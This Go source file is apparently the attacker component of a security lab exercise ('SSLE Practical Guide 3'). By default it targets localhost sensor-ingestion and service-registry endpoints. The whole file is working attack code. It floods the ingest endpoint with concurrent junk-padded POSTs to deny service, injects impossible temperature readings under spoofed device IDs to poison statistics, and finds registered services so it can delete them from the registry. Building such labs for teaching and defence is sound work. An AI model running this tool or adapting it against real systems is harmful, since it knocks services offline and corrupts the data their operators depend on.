package main

import (
	"bytes"
	"encoding/json"
	"flag"
	"fmt"
	"io"
	"log"
	"math/rand"
	"net/http"
	"os"
	"strings"
	"sync"
	"sync/atomic"
	"time"
)

// Config holds the attacker parameters
type Config struct {
	TargetURL    string
	RegistryURL  string
	Mode         string // "dos", "flood", "poison", "deregister", "all"
	Concurrency  int
	RateLimitMs  int
	DeviceID     string
	DurationSecs int
}

var (
	totalRequests atomic.Uint64
	totalErrors   atomic.Uint64
	client        = &http.Client{Timeout: 3 * time.Second}
)

func getEnv(key, fallback string) string {
	if val := os.Getenv(key); val != "" {
		return val
	}
	return fallback
}

func main() {
	var cfg Config
	flag.StringVar(&cfg.TargetURL, "target", getEnv("TARGET_URL", "http://localhost:5001"), "Target ingestion/service base URL")
	flag.StringVar(&cfg.RegistryURL, "registry", getEnv("REGISTRY_URL", "http://localhost:5050"), "Target registry base URL")
	flag.StringVar(&cfg.Mode, "mode", getEnv("ATTACK_MODE", "flood"), "Attack mode: flood (DoS), poison, deregister, or all")
	flag.IntVar(&cfg.Concurrency, "concurrency", 5, "Number of concurrent attacking threads")
	flag.IntVar(&cfg.RateLimitMs, "delay", 10, "Delay between requests per thread in ms (0 for max flood)")
	flag.StringVar(&cfg.DeviceID, "device-id", getEnv("ATTACKER_DEVICE_ID", "attacker-bot-01"), "Attacker spoofed device ID")
	flag.IntVar(&cfg.DurationSecs, "duration", 0, "Duration in seconds to run attack (0 for infinite)")
	flag.Parse()

	log.Printf("======================================================")
	log.Printf("  SSLE Practical Guide 3 - Adversary / Attacker Service")
	log.Printf("======================================================")
	log.Printf("  Target URL:    %s", cfg.TargetURL)
	log.Printf("  Registry URL:  %s", cfg.RegistryURL)
	log.Printf("  Attack Mode:   %s", cfg.Mode)
	log.Printf("  Concurrency:   %d workers", cfg.Concurrency)
	log.Printf("  Worker Delay:  %d ms", cfg.RateLimitMs)
	log.Printf("  Spoofed ID:    %s", cfg.DeviceID)
	log.Printf("======================================================")

	stopCh := make(chan struct{})
	if cfg.DurationSecs > 0 {
		time.AfterFunc(time.Duration(cfg.DurationSecs)*time.Second, func() {
			log.Printf("Attack duration of %d seconds reached. Stopping...", cfg.DurationSecs)
			close(stopCh)
		})
	}

	// Reporter goroutine
	go func() {
		ticker := time.NewTicker(2 * time.Second)
		defer ticker.Stop()
		for {
			select {
			case <-ticker.C:
				reqs := totalRequests.Swap(0)
				errs := totalErrors.Swap(0)
				rps := float64(reqs) / 2.0
				log.Printf("[Attack Metrics] Rate: %.1f req/s | Sent: %d | Failed/Blocked: %d", rps, reqs, errs)
			case <-stopCh:
				return
			}
		}
	}()

	var wg sync.WaitGroup
	for i := 0; i < cfg.Concurrency; i++ {
		wg.Add(1)
		workerID := i + 1
		go func(id int) {
			defer wg.Done()
			runWorker(id, cfg, stopCh)
		}(workerID)
	}

	wg.Wait()
	log.Println("Attacker stopped.")
}

func runWorker(workerID int, cfg Config, stopCh chan struct{}) {
	for {
		select {
		case <-stopCh:
			return
		default:
		}

		mode := cfg.Mode
		if mode == "all" {
			// Randomly select one mode per iteration
			modes := []string{"flood", "poison", "deregister"}
			mode = modes[rand.Intn(len(modes))]
		}

		switch mode {
		case "poison":
			attackPoison(cfg)
		case "deregister":
			attackDeregister(cfg)
		case "flood", "dos":
			attackFlood(cfg)
		default:
			attackFlood(cfg)
		}

		if cfg.RateLimitMs > 0 {
			time.Sleep(time.Duration(cfg.RateLimitMs) * time.Millisecond)
		}
	}
}

// attackFlood: High-frequency HTTP POST to exhaust ingestion resources & QoS
func attackFlood(cfg Config) {
	endpoint := strings.TrimSuffix(cfg.TargetURL, "/") + "/ingest"
	payload := map[string]any{
		"device_id":   cfg.DeviceID,
		"temperature": 25.0 + rand.Float64()*5.0,
		"junk":        strings.Repeat("A", 1024), // 1KB junk payload to consume bandwidth/memory
	}

	body, _ := json.Marshal(payload)
	resp, err := client.Post(endpoint, "application/json", bytes.NewBuffer(body))
	if err != nil {
		totalErrors.Add(1)
		return
	}
	defer resp.Body.Close()
	io.Copy(io.Discard, resp.Body)

	totalRequests.Add(1)
	if resp.StatusCode >= 400 {
		totalErrors.Add(1)
	}
}

// attackPoison: Injects extreme/invalid temperature readings to skew statistics
func attackPoison(cfg Config) {
	endpoint := strings.TrimSuffix(cfg.TargetURL, "/") + "/ingest"
	// Extreme readings outside physical plausibility (-500°C to 1000°C)
	poisonTemps := []float64{999.99, -273.15, 1250.0, -500.0, 9999.0}
	badTemp := poisonTemps[rand.Intn(len(poisonTemps))]

	payload := map[string]any{
		"device_id":   fmt.Sprintf("rogue-sensor-%d", rand.Intn(100)),
		"temperature": badTemp,
		"timestamp":   time.Now().UTC(),
	}

	body, _ := json.Marshal(payload)
	resp, err := client.Post(endpoint, "application/json", bytes.NewBuffer(body))
	if err != nil {
		totalErrors.Add(1)
		return
	}
	defer resp.Body.Close()
	io.Copy(io.Discard, resp.Body)

	totalRequests.Add(1)
	if resp.StatusCode >= 400 {
		totalErrors.Add(1)
	}
}

// attackDeregister: Discovers legitimate services and deletes them from registry
func attackDeregister(cfg Config) {
	servicesEndpoint := strings.TrimSuffix(cfg.RegistryURL, "/") + "/services"
	resp, err := client.Get(servicesEndpoint)
	if err != nil {
		totalErrors.Add(1)
		return
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		totalErrors.Add(1)
		return
	}

	var services map[string]any
	if err := json.NewDecoder(resp.Body).Decode(&services); err != nil {
		totalErrors.Add(1)
		return
	}

	// Delete each discovered service ID
	for serviceID := range services {
		delEndpoint := fmt.Sprintf("%s/register/%s", strings.TrimSuffix(cfg.RegistryURL, "/"), serviceID)
		req, err := http.NewRequest(http.MethodDelete, delEndpoint, nil)
		if err != nil {
			continue
		}
		delResp, err := client.Do(req)
		if err != nil {
			totalErrors.Add(1)
			continue
		}
		delResp.Body.Close()
		totalRequests.Add(1)
		if delResp.StatusCode >= 400 {
			totalErrors.Add(1)
		}
	}
}
